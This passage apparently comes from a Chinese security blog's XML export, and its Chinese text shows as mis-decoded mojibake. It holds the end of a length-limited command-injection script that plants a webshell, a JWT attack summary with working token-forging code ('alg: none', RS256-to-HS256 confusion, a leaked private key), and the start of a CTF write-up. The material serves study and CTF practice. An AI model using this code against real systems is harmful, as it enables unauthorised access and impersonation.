class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>

<h1 id="é•¿åº¦é™åˆ¶æ€»ç»“"><a href="#é•¿åº¦é™åˆ¶æ€»ç»“" class="headerlink" title="é•¿åº¦é™åˆ¶æ€»ç»“"></a>é•¿åº¦é™åˆ¶æ€»ç»“</h1><p>1ï¼šå½“æœ‰é•¿åº¦é™åˆ¶çš„æƒ…å†µä¸‹ï¼Œæœ€å°‘å¯ä»¥åœ¨<code>4</code>å­—ç¬¦<code>æ— dir</code>ç¯å¢ƒä¸‹æ‹¼æ¥å‡º<code>ls -t</code><br>2ï¼šç©ºæ ¼ä¸å¤Ÿç”¨æ—¶å¯ä»¥ç”¨<code>$&#123;IFS&#125;</code>ä»£æ›¿ï¼Œåªè¦å‘½ä»¤éƒ¨åˆ†ä¸å‡ºç°é‡å¤çš„å­—ç¬¦ç»„åˆå°±è¡Œ</p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>rce</tag>
      </tags>
  </entry>
  <entry>
    <title>JWTå¸¸è§å®‰å…¨é—®é¢˜å­¦ä¹ æ€»ç»“</title>
    <url>/posts/40e1eb99/</url>
    <content><![CDATA[<p>Json web token(JWT)ï¼Œæ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSONçš„å¼€æ”¾æ ‡å‡†(<a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519</a>)ã€‚å®ƒå®šä¹‰äº†ä¸€ç§ç´§å‡‘ä¸”è‡ªåŒ…å«çš„æ–¹å¼ï¼Œç”¨äºåœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ä½œä¸ºJSONå¯¹è±¡ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•(SSO)åœºæ™¯ã€‚</p>
<h1 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h1><p>jwtç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š<code>header</code>ã€<code>payload</code>ã€<code>signature</code>ï¼Œç”¨ç‚¹<code>.</code>åˆ†éš”</p>
<h2 id="header"><a href="#header" class="headerlink" title="header"></a>header</h2><p><code>header</code>ç”¨æ¥å£°æ˜<code>token</code>çš„ç±»å‹å’Œç­¾åç”¨çš„ç®—æ³•ç­‰</p>
<p>ç¤ºä¾‹</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>ç»è¿‡<code>Base64Url</code>ç¼–ç åæ„æˆäº†<code>JWT</code>çš„ç¬¬ä¸€éƒ¨åˆ†</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><code>payload</code>å°±æ˜¯å­˜æ”¾æœ‰æ•ˆä¿¡æ¯çš„åœ°æ–¹</p>
<p>ç¤ºä¾‹</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-keyword">true</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p>å®ƒçš„å£°æ˜æœ‰ä¸‰ç±»ï¼šå·²æ³¨å†Œå£°æ˜ï¼ˆRegistered claimsï¼‰ï¼Œå…¬å…±å£°æ˜ï¼ˆpublic claimsï¼‰ï¼Œ ç§äººå£°æ˜ï¼ˆprivate claimsï¼‰</p>
<p>å…¶ä¸­å·²æ³¨å†Œå£°æ˜æœ‰7ä¸ªé»˜è®¤å­—æ®µï¼Œéƒ½ç”±å®˜æ–¹æ‰€å®šä¹‰(<a href="https://www.rfc-editor.org/rfc/rfc7519#section-4.1">å‚è€ƒrfc7519</a>)ï¼Œä½†å¹¶ä¸éƒ½æ˜¯å¿…éœ€çš„</p>
<figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json">iss (issuer)ï¼šJWTçš„å‘è¡Œè€…<br>exp (expiration time)ï¼šè¿‡æœŸæ—¶é—´<br>sub (subject)ï¼šJWTé¢å‘çš„ä¸»é¢˜<br>aud (audience)ï¼šJWTçš„ç”¨æˆ·<br>nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´<br>iat (Issued At)ï¼šç­¾å‘æ—¶é—´<br>jti (JWT ID)ï¼šJWTå”¯ä¸€æ ‡è¯†<br></code></pre></td></tr></table></figure>

<p><code>å…¬å…±å£°æ˜</code>ï¼šè¿™äº›å¯ä»¥ç”±ä½¿ç”¨JWTçš„äººéšæ„å®šä¹‰ã€‚ä½†æ˜¯ä¸ºäº†é¿å…å†²çªï¼Œå®ƒä»¬åº”è¯¥åœ¨IANA JSON Webä»¤ç‰Œæ³¨å†Œè¡¨ä¸­å®šä¹‰ï¼Œæˆ–è€…å®šä¹‰ä¸ºåŒ…å«æŠ—å†²çªå‘½åç©ºé—´çš„ URIã€‚<br><code>ç§äººå£°æ˜</code>ï¼šè¿™äº›æ˜¯ä¸ºåœ¨åŒæ„ä½¿ç”¨å®ƒä»¬çš„å„æ–¹ä¹‹é—´å…±äº«ä¿¡æ¯è€Œåˆ›å»ºçš„è‡ªå®šä¹‰å£°æ˜ï¼Œæ—¢ä¸æ˜¯æ³¨å†Œå£°æ˜ä¹Ÿä¸æ˜¯å…¬å…±å£°æ˜</p>
<p>ç»è¿‡<code>Base64Url</code>ç¼–ç åæ„æˆäº†<code>JWT</code>çš„ç¬¬äºŒéƒ¨åˆ†</p>
<h2 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h2><p>ç­¾åç”¨äºéªŒè¯æ¶ˆæ¯åœ¨æ­¤è¿‡ç¨‹ä¸­æ²¡æœ‰è¢«æ›´æ”¹</p>
<p>è¿™ä¸ªéƒ¨åˆ†éœ€è¦<code>Base64Url</code>ç¼–ç åçš„<code>header</code>å’Œ<code>Base64Url</code>ç¼–ç åçš„<code>payload</code>ä½¿ç”¨<code>.</code>è¿æ¥ï¼Œç»„æˆå­—ç¬¦ä¸²ï¼Œç„¶åé€šè¿‡<code>header</code>ä¸­å£°æ˜çš„åŠ å¯†æ–¹å¼è¿›è¡ŒåŠ ç›<code>secret</code>ç»„åˆåŠ å¯†ï¼Œç„¶åå°±æ„æˆäº†<code>jwt</code>çš„ç¬¬ä¸‰éƒ¨åˆ†</p>
<p>å¦‚æœè¦ä½¿ç”¨<code>HMAC SHA256</code>ç®—æ³•ï¼Œå°†æŒ‰ä»¥ä¸‹æ–¹å¼åˆ›å»ºç­¾å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs SHA256">HMACSHA256(<br>  base64UrlEncode(header) + &quot;.&quot; +<br>  base64UrlEncode(payload),<br>  secret)<br></code></pre></td></tr></table></figure>

<p>secretæ˜¯ä¿å­˜åœ¨æœåŠ¡ç«¯çš„ï¼Œjwtçš„ç­¾å‘ç”Ÿæˆä¹Ÿæ˜¯åœ¨æœåŠ¡ç«¯çš„ï¼Œsecretå°±æ˜¯ç”¨æ¥è¿›è¡Œjwtçš„ç­¾å‘å’Œjwtçš„éªŒè¯ï¼Œæ‰€ä»¥ä¸€æ—¦å®¢æˆ·ç«¯å¾—çŸ¥è¿™ä¸ªsecret, é‚£å°±æ„å‘³ç€å®¢æˆ·ç«¯å¯ä»¥è‡ªæˆ‘ç­¾å‘jwtäº†</p>
<h1 id="å®‰å…¨é—®é¢˜"><a href="#å®‰å…¨é—®é¢˜" class="headerlink" title="å®‰å…¨é—®é¢˜"></a>å®‰å…¨é—®é¢˜</h1><h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h2><p>å› ä¸º<code>payload</code>å’Œ<code>header</code>åªç»è¿‡<code>Base64Url</code>ç¼–ç ï¼Œå¦‚æœå¼€å‘è€…æŠŠä¸€äº›æ•æ„Ÿä¿¡æ¯å­˜æ”¾åˆ°é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾è·å¾—</p>
<h2 id="æœªæ ¡éªŒç­¾å"><a href="#æœªæ ¡éªŒç­¾å" class="headerlink" title="æœªæ ¡éªŒç­¾å"></a>æœªæ ¡éªŒç­¾å</h2><p>æŸäº›æœåŠ¡ç«¯å¹¶æœªæ ¡éªŒJWTç­¾åï¼Œæ‰€ä»¥ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹<code>signature</code>å(æˆ–è€…ç›´æ¥åˆ é™¤<code>signature</code>)çœ‹å…¶æ˜¯å¦è¿˜æœ‰æ•ˆã€‚</p>
<h2 id="ç­¾åç®—æ³•ç½®ç©º-CVE-2015-2951"><a href="#ç­¾åç®—æ³•ç½®ç©º-CVE-2015-2951" class="headerlink" title="ç­¾åç®—æ³•ç½®ç©º(CVE-2015-2951)"></a>ç­¾åç®—æ³•ç½®ç©º(CVE-2015-2951)</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œç­¾åç®—æ³•å¯ä»¥ç¡®ä¿JWTåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šè¢«æ¶æ„ç”¨æˆ·æ‰€ç¯¡æ”¹</p>
<p>ä½†å¤´éƒ¨ä¸­çš„<code>alg</code>å­—æ®µå´å¯ä»¥æ”¹ä¸º<code>none</code>ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åˆ°åä¼šå°†å…¶è®¤å®šä¸ºæ— åŠ å¯†ç®—æ³•ï¼Œ äºæ˜¯å¯¹<code>signature</code>çš„æ£€éªŒä¹Ÿå°±å¤±æ•ˆäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥éšæ„ä¿®æ”¹<code>payload</code>éƒ¨åˆ†ä¼ªé€ <code>token</code></p>
<p>å› ä¸º<code>jwt.io</code>å°†<code>alg</code>ä¸º<code>none</code>è§†ä¸ºæ¶æ„è¡Œä¸ºï¼Œæ‰€ä»¥æ— æ³•é€šè¿‡åœ¨çº¿å·¥å…·ç”ŸæˆJWTï¼Œå¯ä»¥ç”¨<code>python</code>çš„<code>jwt</code>åº“æ¥å®ç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><br>token_dict = &#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1674038291</span>,<br>  <span class="hljs-string">&quot;nbf&quot;</span>: <span class="hljs-number">1674031091</span>,<br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;jti&quot;</span>: <span class="hljs-string">&quot;e41ff441b04bf337ab3ca715f64a76e1&quot;</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><br><br>jwt_token = jwt.encode(token_dict,<br>                       <span class="hljs-string">&quot;&quot;</span>,  				 <span class="hljs-comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,  	 <span class="hljs-comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span><br>                       headers=headers<br>                       )<br><br><span class="hljs-built_in">print</span>(jwt_token)<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œç»“æœ<br><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY3NDAzMTA5MSwiZXhwIjoxNjc0MDM4MjkxLCJuYmYiOjE2NzQwMzEwOTEsInN1YiI6ImFkbWluIiwianRpIjoiZTQxZmY0NDFiMDRiZjMzN2FiM2NhNzE1ZjY0YTc2ZTEifQ.</code></p>
<h2 id="ç­¾åå¯†é’¥çˆ†ç ´"><a href="#ç­¾åå¯†é’¥çˆ†ç ´" class="headerlink" title="ç­¾åå¯†é’¥çˆ†ç ´"></a>ç­¾åå¯†é’¥çˆ†ç ´</h2><p>JWTä½¿ç”¨ç®—æ³•å¯¹<code>header</code>å’Œ<code>payload</code>è¿›è¡ŒåŠ å¯†ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥çˆ†ç ´å‡ºåŠ å¯†å¯†é’¥ï¼Œé‚£ä¹ˆä¹Ÿå°±å¯ä»¥éšæ„ä¿®æ”¹<code>token</code>äº†</p>
<p><a href="https://github.com/Ch1ngg/JWTPyCrack">Github-jwtçˆ†ç ´è„šæœ¬</a></p>
<p><img src="/img/summary/jwt-1.png"></p>
<h2 id="éå¯¹ç§°å¯†ç ç®—æ³•-x3D-gt-å¯¹ç§°å¯†ç ç®—æ³•-CVE-2016-10555"><a href="#éå¯¹ç§°å¯†ç ç®—æ³•-x3D-gt-å¯¹ç§°å¯†ç ç®—æ³•-CVE-2016-10555" class="headerlink" title="éå¯¹ç§°å¯†ç ç®—æ³•&#x3D;&gt;å¯¹ç§°å¯†ç ç®—æ³•(CVE-2016-10555)"></a>éå¯¹ç§°å¯†ç ç®—æ³•&#x3D;&gt;å¯¹ç§°å¯†ç ç®—æ³•(CVE-2016-10555)</h2><p>JWTçš„ç­¾ååŠ å¯†ç®—æ³•æœ‰ä¸¤ç§ï¼Œå¯¹ç§°åŠ å¯†ç®—æ³•å’Œéå¯¹ç§°åŠ å¯†ç®—æ³•</p>
<p>å¯¹ç§°åŠ å¯†ç®—æ³•æ¯”å¦‚HS256ä½¿ç”¨å¯†é’¥ä¸ºæ‰€æœ‰æ¶ˆæ¯è¿›è¡Œç­¾åå’ŒéªŒè¯<br>éå¯¹ç§°åŠ å¯†ç®—æ³•æ¯”å¦‚RS256ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œèº«ä»½éªŒè¯</p>
<p>å¦‚æœæˆ‘ä»¬è·å–åˆ°äº†å…¬é’¥ï¼Œå¯ä»¥å°†å¤´éƒ¨ä¸­çš„ç®—æ³•ä¿®æ”¹ä»<code>RS256</code>æ›´æ”¹ä¸º<code>HS256</code>ï¼Œè¿™æ ·åç«¯ä»£ç å°±ä¼šä½¿ç”¨<code>RSA</code>å…¬é’¥+<code>HS256</code>ç®—æ³•è¿›è¡Œç­¾åéªŒè¯</p>
<p>jsä»£ç å®ç°ä¾‹å­</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;public.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>


<p>pythonä»£ç å®ç°ä¾‹å­</p>
<p>ä¸è¿‡ç”¨pythonè·‘çš„æ—¶å€™å› ä¸ºjwtç‰ˆæœ¬è¿‡é«˜ä¼šæŠ¥é”™<code>The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret</code><br>è§£å†³æ–¹æ³•ï¼š<code>pip install pyjwt==0.4.3</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;data&quot;</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure>

<h2 id="ç§é’¥æ³„éœ²"><a href="#ç§é’¥æ³„éœ²" class="headerlink" title="ç§é’¥æ³„éœ²"></a>ç§é’¥æ³„éœ²</h2><p>å› ä¸º<code>éå¯¹ç§°åŠ å¯†ç®—æ³•</code>åˆ©ç”¨ç§é’¥ç”Ÿæˆ<code>jwt</code>ï¼Œåˆ©ç”¨å…¬é’¥è§£å¯†<code>jwt</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦æœ‰ç§é’¥ç„¶åè‡ªå·±å°±å¯ä»¥é‡æ–°ç”Ÿæˆ</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> privateKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private.key&#x27;</span>);<br><span class="hljs-keyword">var</span> token = jwt.<span class="hljs-title function_">sign</span>(&#123; <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;RS256&#x27;</span> &#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(token)<br></code></pre></td></tr></table></figure>

<p>å¦‚æœè¿è¡ŒæŠ¥é”™<code>Error: secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code><br>å¯ä»¥å¼ºè¡Œæ³¨é‡Š<code>node_modules\jsonwebtoken\sign.js</code>ä¸­å¯¹äºå¯†é’¥é•¿åº¦çš„åˆ¤æ–­</p>
<p><img src="/img/summary/jwt-2.png"></p>
<h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><p>å¬è¯´è¿˜æœ‰é€šè¿‡KIDå®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ³¨å…¥ç­‰æ“ä½œï¼ŒCVE-2018-0114ï¼ŒCVE-2022-39227ï¼Œä¸‹æ¬¡æŠ½ç©ºç ”ç©¶ä¸‹</p>
<h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><p><a href="https://jwt.io/">jwtio</a><br><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a><br><a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p>
<p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://xz.aliyun.com/t/2338">JSON Web Token (JWT) æ”»å‡»æŠ€å·§</a><br><a href="https://www.cnblogs.com/yokan/p/14468030.html">JWTåŸç†åŠå¸¸è§æ”»å‡»æ–¹å¼</a><br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/jwt%E6%80%BB%E7%BB%93/">JWTæ€»ç»“</a><br><a href="https://forum.butian.net/share/1990">CVE-2022-39227æ¼æ´åˆ†æ</a></p>
]]></content>
      <categories>
        <category>æ€»ç»“</category>
      </categories>
      <tags>
        <tag>æ€»ç»“</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>2022HECTF-WP</title>
    <url>/posts/7f0345c3/</url>
    <content><![CDATA[<p>Rank: 13</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="å’¦-å°é²¨é±¼æ¥å–½"><a href="#å’¦-å°é²¨é±¼æ¥å–½" class="headerlink" title="å’¦~å°é²¨é±¼æ¥å–½"></a>å’¦~å°é²¨é±¼æ¥å–½</h2><p>è¿½è¸ªtcpæµï¼ŒæŸä¸ªPOSTåŒ…ä¸­çœ‹åˆ°flag</p>
<p><img src="/img/wp/2022/2022hectf-1.png"></p>
<h2 id="èˆè€…çš„ç§˜å¯†"><a href="#èˆè€…çš„ç§˜å¯†" class="headerlink" title="èˆè€…çš„ç§˜å¯†"></a>èˆè€…çš„ç§˜å¯†</h2><p>æ•°å­—æš´åŠ›ç ´è§£ï¼Œå¾—åˆ°å¯†ç <code>456123</code></p>
<p>ç»™çš„åç¼€æ˜¯pngï¼Œçœ‹å¤´å®é™…ä¸Šæ˜¯gif</p>
<p>stegsolveä¸€å¸§ä¸€å¸§çœ‹å¾—åˆ°flag</p>
<h2 id="ä½ æŠŠæˆ‘flagè—å“ªå»äº†"><a href="#ä½ æŠŠæˆ‘flagè—å“ªå»äº†" class="headerlink" title="ä½ æŠŠæˆ‘flagè—å“ªå»äº†?"></a>ä½ æŠŠæˆ‘flagè—å“ªå»äº†?</h2><p>txtä¸­å­˜åœ¨0å®½å­—ç¬¦ï¼Œå¾—åˆ°<code>flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla</code></p>
<p>docxä¸­å»é™¤å­—ä½“éšè—ï¼Œå¾—åˆ°<code>a2draGxmbG9hbmFpdWZwZ2hoYWx3dWprbGttb3ducGxrbXdseWdhbHBtZmtneWdnaWh1bGRsZ2FveXVsb2lnZ3JwbGt2a2dtcmthcXp4ZW1taXdrbGh1Z2VrbGVvbHBhYW9sZmZtYWdobWZnZm1ndmdqbmJscG1sYWphcHVmamxncGxhb2pwamJmZmJqYndodWdsZ2d5am5nbWxiZnlnbGpiZ3hraXhsbW1xaWtzbXBhcXlvamVyYWZla2FkeGR4eGJhcnhsZ25neW1zaW1odnV3a2FleHNnbHJhcGdna2FibWZ1bGd2bm1hanVmb2VreW1hbGlteGRpampweHlpYWdicG1rdWFsbG5sa3BvZWFnZmxkbHBvc2tpenZ5eHJhYXp4cmd4YW5vaWhxbHhmb2dmZ2dscGdqeWxrZWFrYnlsZnZqb21sbGtnamd5bWdmZGxycGVxZmtsZnNsbWVqaWxwamlrbHBhYXBnbHh5ZXZma3lsZmFwcGJrZHpmbGZmbGxpa3FuaWFsa2Joam9ybmRoc2ZvbWZheXBnaHBxb3hyeWltaGZsbGZobG1rb3JlYW1yb2FrZ3JsamFobWZhaWxpamFueWtmdWFpaGZiemFmYXVmbXNmZm5nZmFsbXJiZmZsZmFmZndsbmptZmdhYWZmYXVhempmaWp4aWFiZmlybW92cHpla2lyYmFzZmpzZ3psdWtvbHl2b2htdmFhbHBrYWhzeGZ6YW1tYmZubWxkenlhYXVpZmxkdmttemJnZnliYW9mZnJmbGZvYWFkZ21sbG5iZ2ZwbnJneGxseXBoeWZubGV4YnZkbmxva2dveWlscHJmbG9uc2hhbGtqYXhuZ2JqaGxtYnBkbGFtaGtqZm5sZ21hYWdmam5qZ2tmcml6bGZmbHBtbWdsYXB4Z211bmluYWF1cGtwZmRpZ3BzYXNtdmtkanZnaXlvZmR1bXBuZ3BhbGpramJsZmhhaHNraW9rcGZnYWF5aG5uZmRzeGtmZnFqYWF6dnZkb3NlZnBwZm9maWd5YW1mbmZuZ3ZsYW9hcGR5aXh2YmZkb3NvYm1sdWJhaXVnanhoZnlma3ZyYWthemdsdXlpbHB2Z2Z3Z3lucWdncGxia3dpaWF4YXJsYWZsYWFsZmt4ZmpscGVnbW1ham5ndWpsb2Z1aWZmbXZpa2ZpbXJhb2dxYWxhbGZtZ3ViYWdmZ2dvYWFrZ3JmcWZoYWVtb3NyYWFmeWZvcHVrdWRhYWxmZ2dpbWhkZm9nbmhrcmxlZmxwYWxnYWxmYXB5amFsZ3Zva2xnZmxsZ2Fm